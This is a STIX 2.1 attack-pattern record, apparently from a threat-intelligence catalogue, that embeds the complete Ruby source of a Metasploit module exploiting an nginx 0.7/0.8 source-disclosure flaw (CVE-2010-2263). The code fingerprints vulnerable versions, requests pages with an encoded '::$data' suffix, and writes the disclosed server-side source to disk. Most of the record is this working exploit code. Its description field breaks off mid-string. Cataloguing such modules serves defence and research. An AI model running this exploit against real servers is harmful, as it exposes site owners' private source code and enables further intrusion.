{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--aa174d0b-f7c4-4001-9119-94d6ff4fa378",
    "created": "2024-08-14T16:28:48.541736Z",
    "modified": "2024-08-14T16:28:48.54174Z",
    "name": "Nginx Source Code Disclosure/Download",
    "description": " This module exploits a source code disclosure/download vulnerability in versions 0.7 and 0.8 of the nginx web server. Versions 0.7.66 and 0.8.40 correct this vulnerability.  'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/nginx_source_disclosure.rb",
            "external_id": "nginx_source_disclosure.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'           => 'Nginx Source Code Disclosure/Download',\n      'Description'    => %q{\n          This module exploits a source code disclosure/download vulnerability in\n        versions 0.7 and 0.8 of the nginx web server. Versions 0.7.66 and 0.8.40\n        correct this vulnerability.\n      },\n      'References'     =>\n        [\n          [ 'CVE', '2010-2263' ],\n          [ 'OSVDB', '65531' ],\n          [ 'BID', '40760' ],\n          [ 'EDB', '13818' ],\n          [ 'EDB', '13822' ]\n        ],\n      'Author'         =>\n        [\n          'Tiago Ferreira <tiago.ccna[at]gmail.com>',\n        ],\n      'License'        =>  MSF_LICENSE)\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'Specify the path to download the file (ex: admin.php)', '/admin.php']),\n        OptString.new('PATH_SAVE', [true, 'The path to save the downloaded source code', '']),\n      ])\n  end\n\n  def run_host(ip)\n    uri = normalize_uri(target_uri.path)\n    path_save = datastore['PATH_SAVE']\n\n    vuln_versions = [\n      # 0.7\n      \"nginx/0.7.56\",\"nginx/0.7.58\",\"nginx/0.7.59\",\n      \"nginx/0.7.60\",\"nginx/0.7.61\",\"nginx/0.7.62\",\n      \"nginx/0.7.63\",\"nginx/0.7.64\",\"nginx/0.7.65\",\n      # 0.8\n      \"nginx/0.8.33\",\"nginx/0.8.34\",\"nginx/0.8.35\",\n      \"nginx/0.8.36\",\"nginx/0.8.37\",\"nginx/0.8.38\",\n      \"nginx/0.8.39\"\n    ]\n\n    get_source = Rex::Text.uri_encode(\"::$data\")\n\n    begin\n      res = send_request_raw(\n        {\n          'method'  => 'GET',\n          'uri'     => \"#{uri}#{get_source}\",\n        }, 25)\n\n      if res.nil?\n        print_error(\"#{full_uri} - nginx - Connection timed out\")\n        return\n      else\n        version = res.headers['Server']\n        http_fingerprint({ :response => res })\n      end\n\n      if vuln_versions.include?(version)\n        print_good(\"#{full_uri} - nginx - Vulnerable version: #{version}\")\n\n        if (res and res.code == 200)\n\n          print_good(\"#{full_uri} - nginx - Getting the source of page #{uri}\")\n\n          save_source = File.new(\"#{path_save}#{uri}\",\"w\")\n          save_source.puts(res.body.to_s)\n          save_source.close\n\n          print_good(\"#{full_uri} - nginx - File successfully saved: #{path_save}#{uri}\") if (File.exist?(\"#{path_save}#{uri}\"))\n\n        else\n          print_error(\"http://#{vhost}:#{rport} - nginx - Unrecognized #{res.code} response\")\n          return\n\n        end\n\n      else\n        if version =~ /nginx/\n          print_error(\"#{full_uri} - nginx - Cannot exploit: the remote server is not vulnerable - Version #{version}\")\n        else\n          print_error(\"#{full_uri} - nginx - Cannot exploit: the remote server is not ngnix\")\n        end\n        return\n\n      end\n\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n    rescue ::Timeout::Error, ::Errno::EPIPE\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}